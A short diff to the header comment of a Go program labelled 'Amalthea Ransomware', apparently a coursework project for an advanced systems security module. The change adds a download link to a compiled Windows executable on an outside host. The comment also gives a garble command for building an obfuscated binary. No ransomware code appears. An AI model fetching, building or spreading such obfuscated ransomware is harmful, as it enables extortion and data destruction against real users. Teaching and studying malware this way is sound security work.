@@ -4,6 +4,7 @@ package main
 
 	Amalthea Ransomware.
 	Developer for IY3D602 - Advanced Systems Security
+	Download: https://cyber.lol/dl/Amalthea.exe
 
 	Use:
 		Obfuscated: `env GOOS=windows GOARCH=amd64 garble -seed=random -literals -debugdir=out build .`
